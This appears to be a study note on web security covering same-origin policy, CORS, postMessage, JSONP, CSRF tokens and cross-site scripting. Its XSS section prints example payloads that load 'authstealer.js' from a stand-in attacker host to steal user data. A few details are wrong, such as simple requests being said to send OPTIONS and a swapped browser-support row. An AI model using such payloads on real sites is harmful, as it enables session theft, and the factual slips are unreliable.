# Web

## Same Origin Policy

An origin is defined as a combination of protocol, host name and port number. Same origin policy allows data of one webpage to be accessible to pages inside same origin only.

Example of same origin checking against `http://www.example.com/dir/page.html`

| Compared URL | Outcome | Reason |
|:- |:-| :-|
|`http://www.example.com/dir/page2.html`|Success|Same protocol, host and port
|`http://www.example.com/dir2/other.html`|Success|Same protocol, host and port
|`http://username:password@www.example.com/dir2/other.html`|Success|Same protocol, host and port
|`http://www.example.com:81/dir/other.html`|Failure|Same protocol and host but different port
|`https://www.example.com/dir/other.html`|Failure|Different protocol
|`http://en.example.com/dir/other.html`|Failure|Different host
|`http://example.com/dir/other.html`|Failure|Different host (exact match required)
|`http://v2.www.example.com/dir/other.html`|Failure|Different host (exact match required)
|`http://www.example.com:80/dir/other.html`|Depends|Port explicit. Depends on implementation in browser.

## Cross Origin Methods

### `document.domain` property

Same origin policy is relaxed for two windows with same value for `document.domain` property. Documents with same value for `document.domain` property can read each other's properties. This might not always work due to acutal implementation.

### [Cross-Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)

**Cross-origin resource sharing (CORS)** is a mechanism that controls whether certain resources (images, stylesheets, scripts, iframes, video etc.) are accessbile from other domain. Browser and server communicate with each other to achieve **CORS** in a fine-grained way.

**CORS** requests are divided as [simple requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests) and [preflighted requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests) according to whether a **OPTIONS** request must be sent first to determine whether actual request is safe to send.

Simple request is safe, which means it does not has any side effect (changing server's data). Preflighted request is unsafe, so it must be preflighted first, hence the name.

![CORS XHR Flowchart](./cors_xhr_flowchart.png)

#### [Simple Request](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests)

Example of simple request to `http://service.example.com` from `http://www.example.com`.

1. Browser sends **OPTIONS** request with `Origin` HTTP header.
    ```http
    Origin: http://www.example.com
    ```
1. Server responds according to target resource cross-origin authority.
    1. Target resrouce is allowed to be accessed from specific origin. Response contains `Access-Control-Allow-Origin` header whose value is an allowed origin.
        ```http
        Access-Control-Allow-Origin: http://www.example.com
        ```
    1. An error page if server does not allow the cross-origin request.
    1. Target resource is allowed be accessed from any origin. It's often used when resource is intended to be completely public and accessible to everyone.
        ```http
        Access-Control-Allow-Origin: *
        ```

#### [Preflighted Request](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests)

1. Request.
    ```http
    OPTIONS /
    Host: service.example.com
    Origin: http://www.example.com
    Access-Control-Request-Method: PUT
    Access-Control-Request-Headers: X-Custom-Header
    ```
1. If server accepts request, respond with following headers:
    ```http
    Access-Control-Allow-Origin: http://www.example.com
    Access-Control-Allow-Methods: PUT, DELETE
    ```

<table>
    <caption>Access Controls Headers</caption>
    <tr>
        <th>Type</th>
        <th>Header</th>
        <th>Explaination</th>
    </tr>
    <tr>
        <td rowspan='3'>Request Headers</td>
        <td>Origin</td>
        <td></td>
    </tr>
    <tr>
        <td>Access-Control-Request-Method</td>
        <td>comma separated list of methods that maybe used in <strong>CORS</strong> request</td>
    </tr>
    <tr>
        <td>Access-Control-Request-Headers</td>
        <td>comma separated list of custom headers that <strong>CORS</strong> requests will send</td>
    </tr>
    <tr>
        <td rowspan='6'>Response Headers</td>
        <td>Access-Control-Allow-Origin</td>
        <td></td>
    </tr>
    <tr>
        <td>Access-Control-Allow-Credentials</td>
        <td></td>
    </tr>
    <tr>
        <td>Access-Control-Allow-Expose-Headers</td>
        <td></td>
    </tr>
    <tr>
        <td>Access-Control-Allow-Max-Age</td>
        <td></td>
    </tr>
    <tr>
        <td>Access-Control-Allow-Methods</td>
        <td></td>
    </tr>
    <tr>
        <td>Access-Control-Allow-Headers</td>
        <td></td>
    </tr>
</table>

**CORS** is a modern alternative to **JSONP**.

<table>
    <tr>
        <th>Test</th>
        <th><strong>CORS</strong></th>
        <th><strong>JSONP</strong></th>
    </tr>
    <tr>
        <td>Supporting HTTP Methods</td>
        <td>All HTTP Methods</td>
        <td><strong>GET</strong> only</td>
    </tr>
    <tr>
        <td>Error Handling</td>
        <td>Good</td>
        <td>Bad</td>
    </tr>
    <tr>
        <td>Browsers</td>
        <td>Legacy Browsers</td>
        <td>Modern Browsers</td>
    </tr>
    <tr>
        <td>Security</td>
        <td>Able to defend XSS</td>
        <td>Susceptible to XSS</td>
    </tr>
</table>

1. [MDN CROS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS)
1. [Cross-Origin Resource Sharing Standard](https://www.w3.org/TR/cors/)

### [Web Messaging (Cross-document messaging)](https://en.wikipedia.org/wiki/Web_Messaging)

Web messaging allows scripts inside documents across origins to send text messages to each other. It relaxed security policy related to cross-site scripting a little bit for non-hostile pages.

If `postMessage()` method of `window` object is called, an _message_ event will be fired and handler scripts on other documents will be called. `postMessage()` is non-blocking call, messages are processed asynchronously.

Message event interface.

- data - Actual incoming text message.
- origin - Origin of source document, including protocol, hostname and port.
- source - `WindowProxy` of source window.

Post message to target document `contentWindow` and origin `http://example.com`

```javascript
var o = document.getElementsByTagName('iframe')[0];
o.contentWindow.postMessage('Hello B', 'http://example.com/');
```

Handles message event and post some messsage back to event source.

```javascript
function receiver(event) {
  if (event.origin == 'http://example.net') {
    if (event.data == 'Hello B') {
      event.source.postMessage('Hello A, how are you?', event.origin);
    }
    else {
      alert(event.data);
    }
  }
}
window.addEventListener('message', receiver, false);
```

Origins must be carefully checked to prevent cross-site scripting.

1. [Web Messaging Standard](https://html.spec.whatwg.org/multipage/web-messaging.html#web-messaging)

### [**JSONP**](https://en.wikipedia.org/wiki/JSONP)

**JSONP(JSON with Padding)** exploits the fact that HTML elements with `src` attribute (`<script>`, `<img>`, `<iframe>`) are allowed to access cross domain data.

`<script>` element links to cross origin url.

```html
<script type="application/javascript"
    src="http://server.example.com/Users/1234?callback=parseResponse">
</script>
```

Returned pure JSON data is wrapped in a function call `parseResponse()` to enable scripts on current page to access it.

```javascript
parseResponse({"Name": "Foo", "Id": 1234, "Rank": 7});
```

**JSONP** is susceptible to XSS attack and should be replaced by **CORS** due to inherent insecurities.

### [**WebSocket**](https://en.wikipedia.org/wiki/WebSocket)

> Modern browsers will permit a script to connect to a WebSocket address without applying the same-origin policy. However, they recognize when a WebSocket URI is used, and insert an Origin: header into the request that indicates the origin of the script requesting the connection. To ensure cross-site security, the WebSocket server must compare the header data against a whitelist of origins permitted to receive a reply.

1. [WebSocket Cross-Site Attack](https://www.ibm.com/developerworks/cn/java/j-lo-websocket-cross-site/index.html)

## Security

### [**C**ross-**S**ite **R**equest **F**orgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)

CRSF exploits the trust that a site has in a user's browser to send malicious request disguised as normal user request to target website. Both the user and the target website can be victims of CRSF attack. 

CRSF attack can be done by specially-crafted image tags, hidden forms, and JavaScript XMLHttpRequests, even without interaction or knowledge of user.

### Prevention

Most CSRF prevention techniques work by embedding aditional data into request that allows server to determine validity of request.

#### **S**ynchronizer **T**oken **P**attern

STP is a technique that injects unique and unpredictable token in all HTML forms rendered by server, so that each request from user contains this unique token. Attackers have no way to forge request with correct temporary token to pass server side validation.

```html
<input type="hidden" name="csrfmiddlewaretoke" value="KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt"/>
```

STP introduces complexity on server side due to burden associated with token validation on each request. There two types of token generation strategies.

1. One token per request - Each request has its unique token and server remembers the latest token, only the request with latest token can pass server side token validation if user opens multiple tabs of same html page.
1. One token per session - Inside single session, all requests by same html form share same token, this allows users to open multiple tabs and choose whichever one they like to submit request.

#### Cookie-to-header token

On login, the web application sets a cookie containing a random token that ramains the same for the whole user session.

```HTTP
Set-Cookie: Csrf-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/
```

JavaScipt on the client side reads its value and copies it into a custom HTTP Header sent with each transactional request.

```HTTP
X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql
```

The server validates presence and integrity of the token.

This method relies on same-origin policy which only allows JavaScript within same origin to be able to read the cookie's value, so that attackers are not able to read the token and forge a request.

The CSRF token cookie must not have `httpOnly` flag, because _HttpOnly_ cookie cannot be accessed by client-side APIs.

#### Others

1. Checking HTTP Headers: `X-Requested-With`, `Referer`, `Origin`, this is insecure when http headers can be manipulated.

### [Cross-site scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting)

Cross-site scripting attacks use know vulnerabilities in web-based applications to inject malicious script to pages hosted by server, when pages with malicious contents delivered to clients, attackers can gain access to users' sensitive information including session cookies.

#### Types

**Non-persistent (Reflected) XSS**, An reflected attack is typically delivered via email or neutral website. Users may be tricked into clicking innocent-looking links with malicious script, which gets executed and stoles users' private information or submit malicious content to server.

DOM-based XSS is a type of non-persistent XSS attack that injected malacious script manipulates DOM directly instead of communicating with server to attack certain users.

A malicious url:

```html
http://bobssite.org?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E 
```

Actual content:

```html
http://bobssite.org?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js"></iframe>
```

If it's clicked  `<script>` tag gets injected and `authstrealer.js` runs to steal users' private information.

**Persistent (or stored) XSS** refers to malicious content being saved by the server and embedded into normal pages delivered to all users. Persistent XSS vulnerability is much more devastating than non-persistent one, cause all users are susceptible to attack.

If a website receives contents provided by users without sanitization, malicious scripts get injected to website.

```html
I love the puppies in this story! They're so cute!<script src="http://mallorysevilsite.com/authstealer.js">
```

Other users clicking on this text tag could be attacked.

#### Prevention

1. HTML entity encoding, JavaScript escaping, CSS escaping, URL encoding.
1. User input validation

### [Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy)

### [Hash-based message authentication code](https://en.wikipedia.org/wiki/Hash-based_message_authentication_code)